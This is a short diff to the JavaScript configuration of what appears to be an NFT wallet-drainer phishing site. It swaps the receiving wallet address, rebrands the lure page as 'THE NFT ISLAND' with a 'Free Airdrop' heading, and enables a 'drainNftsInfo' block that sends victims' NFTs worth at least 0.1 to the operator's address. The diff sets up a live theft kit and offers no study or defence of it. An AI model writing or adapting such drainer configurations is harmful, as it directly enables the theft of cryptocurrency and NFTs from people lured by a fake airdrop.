@@ -1,6 +1,6 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0x155Aa58401F6e95B03a905D0e6DBb19150fd13e5',
   collectionInfo = {
-    name: 'THE NFT WORLD',
+    name: 'THE NFT ISLAND',
     socialMedia: {
       discord: 'https://discord.gg',
       twitter: 'https://twitter.com',
@@ -10,7 +10,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
 
   indexPageInfo = {
     backgroundImage: 'background.jpg',
-    title: '{name}',
+    title: '{NFT ISLAND}',
     underTitle: 'Free Airdrop',
   },
 
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x155Aa58401F6e95B03a905D0e6DBb19150fd13e5',
   },
 
   customStrings = {
